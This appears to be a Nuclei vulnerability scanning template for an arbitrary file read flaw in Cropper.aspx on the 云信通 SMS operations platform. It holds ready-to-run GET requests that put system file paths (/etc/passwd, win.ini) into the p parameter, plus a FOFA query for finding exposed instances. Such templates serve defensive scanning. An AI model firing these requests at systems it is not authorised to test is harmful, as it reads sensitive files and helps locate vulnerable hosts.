id: ctyun-Cropper-fileRead

info:
  name: 云信通短信运营管理平台 Cropper.aspx - 参数任意文件读取漏洞
  author: leadlife
  severity: high
  metadata:
    verified: true
    fofa-qeury: body="短信" && body="Simpla" && body="chklogin.aspx"
  tags: yunxintong,fileRead

http:
  - method: GET
    path:
      - "{{BaseURL}}/Cropper.aspx?p=C://Windows/win.ini"
      - "{{BaseURL}}/Cropper.aspx?p=/etc/passwd"
    
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or
